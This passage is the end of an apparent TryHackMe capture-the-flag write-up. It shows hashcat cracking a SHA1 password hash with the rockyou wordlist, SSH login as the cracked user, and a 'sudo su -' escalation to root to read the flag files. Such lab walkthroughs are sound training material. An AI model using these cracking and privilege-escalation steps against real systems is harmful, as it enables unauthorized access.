</code></pre><p>The cracked password can be seen by,</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Host%20memory%20required%20for%20this%20attack:%200%20MB%0A%0ADictionary%20cache%20hit:%0A*%20Filename..:%20/usr/share/wordlists/rockyou.txt%0A*%20Passwords.:%2014344385%0A*%20Bytes.....:%20139921507%0A*%20Keyspace..:%2014344385%0A%0A046385855fc9580393853d8e81f240b66fe9a7b8:%3Cpassword%3E%0A%0ASession..........:%20hashcat%0AStatus...........:%20Cracked%0AHash.Name........:%20SHA1%0AHash.Target......:%20046385855fc9580393853d8e81f240b66fe9a7b8%0ATime.Started.....:%20Sat%20Dec%2024%2005:14:29%202020,%20(7%20secs)%0ATime.Estimated...:%20Sat%20Dec%2024%2005:14:36%202020,%20(0%20secs)%0AGuess.Base.......:%20File%20(/usr/share/wordlists/rockyou.txt)%0AGuess.Queue......:%201/1%20(100.00%25)%0ASpeed.#1.........:%20%20%20666.1%20kH/s%20(1.10ms)%20@%20Accel:1024%20Loops:1%20Thr:1%20Vec:4%0ARecovered........:%201/1%20(100.00%25)%20Digests%0AProgress.........:%204971567/14344385%20(34.66%25)%0ARejected.........:%201071/4971567%20(0.02%25)%0ARestore.Point....:%204969519/14344385%20(34.64%25)%0ARestore.Sub.#1...:%20Salt:0%20Amplifier:0-1%20Iteration:0-1%0ACandidates.#1....:%20nydia26%20-%3E%20ny11590%0A%0AStarted:%20Sat%20Dec%2024%2005:14:26%202020%0AStopped:%20Sat%20Dec%2024%2005:14:38%202020" type="button"></button></div></div><pre><code>Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

046385855fc9580393853d8e81f240b66fe9a7b8:&lt;password&gt;

Session..........: hashcat
Status...........: Cracked
Hash.Name........: SHA1
Hash.Target......: 046385855fc9580393853d8e81f240b66fe9a7b8
Time.Started.....: Sat Dec 24 05:14:29 2020, (7 secs)
Time.Estimated...: Sat Dec 24 05:14:36 2020, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   666.1 kH/s (1.10ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4971567/14344385 (34.66%)
Rejected.........: 1071/4971567 (0.02%)
Restore.Point....: 4969519/14344385 (34.64%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: nydia26 -&gt; ny11590

Started: Sat Dec 24 05:14:26 2020
Stopped: Sat Dec 24 05:14:38 2020
</code></pre><p>Try to ssh the machine <code>ssh nyan@&lt;ip&gt;</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nyan@%3Cip%3E's%20password:%0AWelcome%20to%20Ubuntu%2016.04.6%20LTS%20(GNU/Linux%204.4.0-142-generic%20x86_64)%0A%0A%20*%20Documentation:%20%20https://help.ubuntu.com%0A%20*%20Management:%20%20%20%20%20https://landscape.canonical.com%0A%20*%20Support:%20%20%20%20%20%20%20%20https://ubuntu.com/advantage%0ALast%20login:%20Sat%20Dec%2021%2008:37:54%202019%0Anyan@ubuntu:~$%20ls%0Auser.txt" type="button"></button></div></div><pre><code>nyan@&lt;ip&gt;'s password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat Dec 21 08:37:54 2019
nyan@ubuntu:~$ ls
user.txt
</code></pre><p>The contents of <code>user.txt</code> is the first flag.</p><p>Check if nyan is allowed to run any sudo commands.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nyan@ubuntu:~$%20sudo%20-l%0AMatching%20Defaults%20entries%20for%20nyan%20on%20ubuntu:%0A%20%20%20%20env_reset,%20mail_badpass,%20secure_path=/usr/local/sbin%5C:/usr/local/bin%5C:/usr/sbin%5C:/usr/bin%5C:/sbin%5C:/bin%5C:/snap/bin%0A%0AUser%20nyan%20may%20run%20the%20following%20commands%20on%20ubuntu:%0A%20%20%20%20(root)%20NOPASSWD:%20/bin/su" type="button"></button></div></div><pre><code>nyan@ubuntu:~$ sudo -l
Matching Defaults entries for nyan on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nyan may run the following commands on ubuntu:
    (root) NOPASSWD: /bin/su
</code></pre><p>Switch to root user to get second flag in <code>root.txt</code> file.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nyan@ubuntu:~$%20sudo%20su%20-%0Aroot@ubuntu:~#%20ls%0Aroot.txt" type="button"></button></div></div><pre><code>nyan@ubuntu:~$ sudo su -
root@ubuntu:~# ls
root.txt
</code></pre></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/pentest/" class="post-tag no-text-decoration" >pentest</a></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/tryhackme-active-directory-basics/"><div class="card-body"> <span class="timeago small" > Mar 21 <i class="unloaded">2021-03-21T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Active Directory Basics</h3><div class="text-muted small"><p> Active Directory Basics This room contains info about Windows Active Directory and tools to enumerate them. For complete tryhackme path, refer the link Task 8 - Hands-On Lab References ...</p></div></div></a></div><div class="card"> <a href="/posts/tryhackme-alfred/"><div class="card-body"> <span class="timeago small" > Mar 22 <i class="unloaded">2021-03-22T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Alfred</h3><div class="text-muted small"><p> Alfred This room contains detailed info about jenkins exploitation and windows privilege escalation methods. For complete tryhackme path, refer the link. Tools Used Enumeration NMAP ...</p></div></div></a></div><div class="card"> <a href="/posts/tryhackme-blue/"><div class="card-body"> <span class="timeago small" > Mar 23 <i class="unloaded">2021-03-23T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Blue</h3><div class="text-muted small"><p> Blue This room contains detailed info about eternalblue vulnerability of samba and windows privilege escalation methods. For complete tryhackme path, refer the link. Tools Used Enumeratio...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/tryhackme-network-services-2/" class="btn btn-outline-primary"><p>Writeup for TryHackMe room - Network Services 2</p></a> <a href="/posts/tryhackme-basic-pentesting/" class="btn btn-outline-primary"><p>Writeup for TryHackMe room - Basic Pentesting</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> Â© 2021 <a href="https://github.com/4n3i5v74">4n3i5v74</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/tryhackme/">tryhackme</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/privesc/">privesc</a> <a class="post-tag" href="/tags/pentest/">pentest</a> <a class="post-tag" href="/tags/cheatsheet/">cheatsheet</a> <a class="post-tag" href="/tags/network/">network</a> <a class="post-tag" href="/tags/protocols/">protocols</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/windows/">windows</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://4n3i5v74.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
